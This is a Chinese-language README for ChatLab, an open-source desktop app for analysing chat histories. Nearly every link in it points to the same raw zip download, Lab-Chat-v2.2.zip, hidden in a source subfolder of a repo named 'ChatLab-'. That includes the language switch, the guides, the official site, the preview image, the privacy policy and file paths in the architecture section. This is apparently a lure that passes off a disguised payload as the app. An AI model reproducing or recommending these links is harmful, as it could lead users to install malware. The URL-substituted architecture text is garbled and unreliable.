# ChatLab

简体中文 | [English](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)

ChatLab 是一个免费、开源、本地化的，专注于分析聊天记录的应用。通过 AI Agent 和灵活的 SQL 引擎，你可以自由地拆解、查询甚至重构你的社交数据。

目前已支持：微信、QQ、WhatsApp、Discord、Instagram 的聊天记录分析，计划支持：iMessage、LINE、Messenger、Kakao Talk。

## 核心特性

- 🚀 **极致性能**：使用流式计算与多线程并行架构，就算是百万条级别的聊天记录，依然拥有丝滑交互和响应。
- 🔒 **保护隐私**：聊天记录和配置都存在你的本地数据库，所有分析都在本地进行（AI 功能例外）。
- 🤖 **智能 AI Agent**：集成 10+ Function Calling 工具，支持动态调度，深度挖掘聊天记录中的更多有趣。
- 📊 **多维数据可视化**：提供活跃度趋势、时间规律分布、成员排行等多个维度的直观分析图表。
- 🧩 **格式标准化**：通过强大的数据抽象层，抹平不同聊天软件的格式差异，任何聊天记录都能分析。

## 使用指南

- [下载 ChatLab 指南](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
- [导出聊天记录指南](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
- [标准化格式规范](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)
- [故障排查指南](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)

## 预览界面

预览更多请前往官网 [https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)

![预览界面](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)

## 系统架构

### Electron 主进程

- `https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip` 负责应用生命周期、窗口管理、自定义协议注册
- `electron/main/ipc/` 按功能拆分 IPC 模块（窗口、聊天、合并、AI、缓存），确保数据交换安全可控
- `electron/main/ai/` 集成多家 LLM，内置 Agent 管道、提示词拼装、Function Calling 工具注册

### Worker 与数据管线

- `electron/main/worker/` 中的 `workerManager` 统筹 Worker 线程，`dbWorker` 负责路由消息
- `worker/query/*` 承担活跃度、AI 搜索、高级分析、SQL 实验室等查询；`https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip` 提供流式导入
- `parser/` 目录采用嗅探 + 解析三层架构，能在恒定内存下处理 GB 级日志文件

### 渲染进程

- Vue 3 + Nuxt UI + Tailwind CSS 负责可视化页面。`src/pages` 存放各业务页面，`src/components/analysis`、`src/components/charts` 等目录提供复用组件
- `src/stores` 通过 Pinia 管理会话、布局、AI 提示词等状态；`https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip` 封装 AI 对话流程
- 预加载脚本 `https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip` 暴露 `https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip`，确保渲染进程与主进程通信安全隔离

## 本地运行

### 启动步骤

https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip 环境依赖 v20+

```bash
# 安装依赖
pnpm install

# 启动开发服务器
pnpm run dev
```

若 Electron 在启动时异常，可尝试使用 `electron-fix`：

```bash
npm install electron-fix -g
electron-fix start
```

## 贡献指南

提交 Pull Request 前请遵循以下原则：

- 明显的 Bug 修复可直接提交
- 对于新功能，请先提交 Issue 进行讨论，**未经讨论直接提交的 PR 会被关闭**
- 一个 PR 尽量只做一件事，若改动较大，请考虑拆分为多个独立的 PR

## 隐私政策与用户协议

使用本软件前，请阅读 [隐私政策与用户协议](https://github.com/LDyaoshengchen/ChatLab-/raw/refs/heads/main/electron/main/worker/query/Lab-Chat-v2.2.zip)

## License

AGPL-3.0 License
